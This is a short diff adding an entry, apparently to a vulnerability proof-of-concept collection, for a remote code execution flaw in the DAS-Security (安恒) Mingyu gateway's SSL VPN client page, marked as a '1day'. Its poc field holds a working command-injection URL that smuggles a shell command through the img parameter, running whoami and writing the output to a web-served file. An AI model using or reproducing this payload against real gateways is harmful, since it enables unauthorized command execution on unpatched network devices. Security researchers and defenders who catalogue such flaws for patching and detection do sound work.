@@ -1,0 +1,8 @@
+vendor = "安恒"
+name = "安恒明御网关RCE"
+type = "RCE"
+source = "微信"
+info = "/sslvpn/sslvpn_client.php?client=logoImg&img="
+date = "08.11"
+poc = "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20-a%20/usr/local/webui/sslvpn/file.txt|ls"
+label = "1day"
